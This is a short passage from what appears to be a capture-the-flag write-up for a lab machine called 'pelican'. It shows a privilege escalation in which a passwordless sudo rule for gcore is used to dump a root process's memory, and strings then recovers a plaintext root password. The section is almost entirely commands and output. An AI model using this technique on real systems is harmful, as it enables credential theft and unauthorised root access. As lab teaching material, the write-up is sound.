## Priv Esc

So we can run sudo gcore without providing password

```text
charles@pelican /opt/zookeeper$ sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

There's a video walkthrough on the last [part here](https://www.youtube.com/watch?v=-8Mca4ZV7rU). The key thing to note is that gcore dumps the contents of running processes and there's a password-store process running

```text
charles@pelican ~/tmp$ ps aux | grep password
root       493  0.0  0.0   2276    72 ?        Ss   10:05   0:00 /usr/bin/password-store
root     19163  0.0  0.0   2276    76 ?        Ss   11:52   0:00 /usr/bin/password-store
root     19475  0.0  0.0   2276    72 ?        Ss   11:54   0:00 /usr/bin/password-store
root     19498  0.0  0.0   2276    72 ?        Ss   11:54   0:00 /usr/bin/password-store sfd
charles  20020  0.0  0.0   6076   888 pts/0    S+   11:56   0:00 grep password
```

Dump it and run `strings`

```text
charles@pelican ~/tmp$ sudo gcore -a -o pstore 493
0x00007f40ff4dd6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffc48e50c90, remaining=remaining@entry=0x7ffc48e50c90) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28      ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile pstore.493
[Inferior 1 (process 493) detached]

charles@pelican ~/tmp$ ls -lah
total 3.9M
drwxr-xr-x 2 charles charles 4.0K Jun 18 11:56 .
drwxr-xr-x 5 charles charles 4.0K Jun 18 11:48 ..
-rwxr-xr-x 1 charles charles 445K Jun 18 04:06 linpeas.sh
-rw-r--r-- 1 charles charles 177K Jun 18 11:49 linpeas.txt
-rwxr-xr-x 1 charles charles  41K Jun 18 04:06 lse.sh
-rw-r--r-- 1 charles charles 410K Jun 18 11:50 lse.txt
-rw-r--r-- 1 root    root    2.5M Jun 18 11:43 nginx.log.556
-rw-r--r-- 1 root    root    345K Jun 18 11:56 pstore.493

charles@pelican ~/tmp$ strings pstore.493
CORE
password-store
/usr/bin/password-store
CORE
CORE
/usr/bin/passwor
////////////////
LINUX
/usr/bin/passwor
////////////////
IGISCORE
CORE
ELIFCORE
/usr/bin/password-store
/usr/bin/password-store
/usr/lib/x86_64-linux-gnu/libc-2.28.so
/usr/lib/x86_64-linux-gnu/libc-2.28.so
/usr/lib/x86_64-linux-gnu/ld-2.28.so
/usr/lib/x86_64-linux-gnu/ld-2.28.so
fork failed!
/tmp
;*3$"
aliases
ethers
group
gshadow
hosts
initgroups
netgroup
networks
passwd
protocols
publickey
services
shadow
CAk[S
libc.so.6
/lib/x86_64-linux-gnu
libc.so.6
;*3$"
sse2
x86_64
avx512_1
i586
i686
haswell
xeon_phi
linux-vdso.so.1
tls/x86_64/x86_64/tls/x86_64/
/lib/x86_64-linux-gnu/libc.so.6
x<'.
/usr/bin/passwor
////////////////
/usr/bin/passwor
////////////////
001 Password: root:
ClogKingpinInning731
x86_64
/usr/bin/password-store
HOME=/root
LOGNAME=root
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/root
/usr/bin/password-store
bemX
__vdso_clock_gettime
__vdso_gettimeofday
__vdso_time
__vdso_getcpu
linux-vdso.so.1
LINUX_2.6
Linux
Linux
4.19.0-10-amd64
AVAUATSH
[A\A]A^]
D9+u
[A\A]A^]
D9#u
H+=x
H#=y
H+=K
H#=L
AVAUATI
[A\A]A^]
GCC: (Debian 8.3.0-6) 8.3.0
.shstrtab
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_d
.dynamic
.rodata
.note
.eh_frame_hdr
.eh_frame
.text
.altinstructions
.altinstr_replacement
.comment
.shstrtab
note0
load
```

There's the root password.